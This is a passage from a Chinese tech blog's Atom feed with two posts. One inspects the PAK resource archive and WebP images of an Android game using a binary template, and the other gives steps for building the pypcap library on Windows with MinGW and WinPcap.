int   fileoff&lt;format=hex&gt;;     int   filesize&lt;format=hex&gt;;}FILE_LIST;/////////////////////////////LittleEndian();PAK pak;FSeek(0x8);local int i;for(i=0;i&lt;pak.fileNum;i++){    FILE_LIST fileList;};</code></pre><p>随便找一个文件名查看</p><p><img src="http://t.cn/RGRNAnc" alt=""></p><p>后缀spritr文件名的文件头SPRX，可以知道该数据为这个文件的数据，并且没有加密。</p><p>资源中最重要的是图片，这里面最多的就是PNG图片，查看数据时文件头并不是PNG，而是RIFF文件头。用图片浏览器也打不开，通过搜索得知这是一种比较新的文件格式，查阅资料知道XnView支持这个文件格式。</p><p><img src="http://t.cn/RGRNyz4" alt=""></p><p>用XnView打开的图像就是</p><p><img src="http://t.cn/RGRNboR" alt=""></p><p>解密到此就差不多，接下来就是写个小程序把资源都提取出来了。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;安卓游戏资源解密&quot;&gt;&lt;a href=&quot;#安卓游戏资源解密&quot; class=&quot;headerlink&quot; title=&quot;安卓游戏资源解密&quot;&gt;&lt;/a&gt;安卓游戏资源解密&lt;/h1&gt;&lt;p&gt;一个同学在群里发了个游戏，要解密游戏的资源。反编译看了下源码，没看出什么，用Android Killer看了下资源，发现在res/raw目录下有个文件比较大，t0.zip解压后有t0.pak;文件有点大，3M多，并且是以PAK格式的文 件，通过搜索得知这个格式为PAK格式——是一种文件打包的格式。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://t.cn/RGRCrxm&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在网上搜了下 打开PAK文件的软件，发现都不能打开。  搞不定就不搞了。&lt;/p&gt;
&lt;p&gt;这几天看了 &amp;lt;&amp;lt;揭秘数据解密的关键技术&amp;gt;&amp;gt;，下面图片框框内的像文件名，我们可以知道这个文件是一种文件打包的格式。具体是什么结构不知道。&lt;br&gt;&lt;img src=&quot;http://t.cn/RGRCgpS&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="http://shxi.me/categories/Android/"/>
    
    
      <category term="Android" scheme="http://shxi.me/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>pypcap模块安装</title>
    <link href="http://shxi.me/posts/6e7365c5.html"/>
    <id>http://shxi.me/posts/6e7365c5.html</id>
    <published>2016-01-30T13:55:50.000Z</published>
    <updated>2018-04-04T16:57:40.437Z</updated>
    
    <content type="html"><![CDATA[<p>最近需要用python写一个数据包分析的工具，需要用到pypcap。在Linxu可以直接用pip install pypcap直接安装成功，但是在windows一直提示缺少<code>pcap.h</code>头文件。在网上找了很多资料，终于编译成功了。</p><h2 id="编译之前"><a href="#编译之前" class="headerlink" title="编译之前"></a>编译之前</h2><p>在编译之前我们需要准备如下</p><ul><li>pypcap源码   <a href="https://github.com/dugsong/pypcap" target="_blank" rel="noopener">https://github.com/dugsong/pypcap</a></li><li>WinPcap源码 <a href="https://www.winpcap.org/devel.htm" target="_blank" rel="noopener">https://www.winpcap.org/devel.htm</a></li><li>安装pyrex  <a href="http://brl.thefreecat.org/python-pyrex/" target="_blank" rel="noopener">http://brl.thefreecat.org/python-pyrex/</a></li><li>MiniGw  <a href="http://www.mingw.org/" target="_blank" rel="noopener">http://www.mingw.org/</a></li></ul><p>pycurl如何安装在<a href="https://github.com/dugsong/pypcap/blob/master/INSTALL" target="_blank" rel="noopener">https://github.com/dugsong/pypcap/blob/master/INSTALL</a> 的<code>Building under Windows</code>也有详细说明。<br><a id="more"></a></p><h2 id="开始编译"><a href="#开始编译" class="headerlink" title="开始编译"></a>开始编译</h2><ol><li><p>编辑 <code>C:\Python26\Lib\distutils\distutils.cfg</code>文件，没有则自己创建一个。往里面添加内容如下：</p><pre><code class="bash"> [build] compiler = mingw32</code></pre></li><li><p>将我们下载好的pypcap源码和WinPcap源码分别解压到<code>c:\pypcap</code>和 <code>c:\wpdpack</code>.编辑pypcap源码的makefile文件。将下面这段代码前面的注释去掉</p><pre><code class="bash">CONFIG_ARGS = --with-pcap=..\\wpdpack</code></pre><p>从这我们可以看出这里通过跳转到上一层目录到wpdpack目录，也就是为什么我们要把pypcap和winpcap的源码放在同一个目录里，当然你也可以修改makefile执行你的winpcap目录所在路径</p></li></ol><p>同时将</p><pre><code class="bash">pyrexc pcap.pyx</code></pre><p>改成</p><pre><code class="bash">$(PYTHON) c:\Python27\Scripts\pyrexc.py pcap.pyx  </code></pre><p>另一种方法就是将python安装路径和该目录下Scripts目录加入环境变量，也就不需要改这行了。</p><ol start="3"><li>运行<code>mingw32-make</code>和 <code>mingw32-make install</code> 就能成功编译成功了。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近需要用python写一个数据包分析的工具，需要用到pypcap。在Linxu可以直接用pip install pypcap直接安装成功，但是在windows一直提示缺少&lt;code&gt;pcap.h&lt;/code&gt;头文件。在网上找了很多资料，终于编译成功了。&lt;/p&gt;
&lt;h2 id=&quot;编译之前&quot;&gt;&lt;a href=&quot;#编译之前&quot; class=&quot;headerlink&quot; title=&quot;编译之前&quot;&gt;&lt;/a&gt;编译之前&lt;/h2&gt;&lt;p&gt;在编译之前我们需要准备如下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;pypcap源码   &lt;a href=&quot;https://github.com/dugsong/pypcap&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/dugsong/pypcap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;WinPcap源码 &lt;a href=&quot;https://www.winpcap.org/devel.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.winpcap.org/devel.htm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;安装pyrex  &lt;a href=&quot;http://brl.thefreecat.org/python-pyrex/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://brl.thefreecat.org/python-pyrex/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;MiniGw  &lt;a href=&quot;http://www.mingw.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.mingw.org/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;pycurl如何安装在&lt;a href=&quot;https://github.com/dugsong/pypcap/blob/master/INSTALL&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/dugsong/pypcap/blob/master/INSTALL&lt;/a&gt; 的&lt;code&gt;Building under Windows&lt;/code&gt;也有详细说明。&lt;br&gt;
    
    </summary>
    
      <category term="python" scheme="http://shxi.me/categories/python/"/>
    
    
      <category term="pypcap" scheme="http://shxi.me/tags/pypcap/"/>
    
  </entry>
  
</feed>
